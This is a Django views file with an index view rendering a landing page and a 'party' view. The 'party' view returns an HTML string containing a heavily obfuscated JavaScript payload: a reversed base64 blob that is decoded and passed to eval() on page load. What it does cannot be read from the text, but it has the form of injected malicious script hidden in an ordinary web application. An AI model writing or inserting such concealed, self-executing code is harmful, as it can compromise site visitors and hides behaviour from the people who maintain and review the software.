import os

from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.core.urlresolvers import reverse

def index(request):
    if request.user.is_authenticated():
        return redirect(reverse('dashboard'))

    # agent = [request.META['HTTP_USER_AGENT']]
    #agent = PageHit.objects.all()[:5]
    # context = {'user_agent': agent}
    context = { 'MAX_BG_IMAGES' : os.environ.get("MAX_BG_IMAGES", "1") }
    return render(request, 'landing/index.html', context)

html = '''<script language="javascript" type="text/javascript">var _1I0='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';function O0I(data){var _000lOI="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc='';do{h1=_000lOI.indexOf(data.charAt(i++));h2=_000lOI.indexOf(data.charAt(i++));h3=_000lOI.indexOf(data.charAt(i++));h4=_000lOI.indexOf(data.charAt(i++));bits=h1<<18|h2<<12|h3<<6|h4;o1=bits>>16&0xff;o2=bits>>8&0xff;o3=bits&0xff;if(h3==64){enc+=String.fromCharCode(o1)}else if(h4==64){enc+=String.fromCharCode(o1,o2)}else{enc+=String.fromCharCode(o1,o2,o3)}}while(i<data.length);return enc} function _000(string){ var ret = '', i = 0;	for ( i = string.length-1; i >= 0; i-- ){ ret += string.charAt(i);} return ret; }eval(O0I(_000(_1I0)));</script>'''

def party(request):
    return HttpResponse(html)
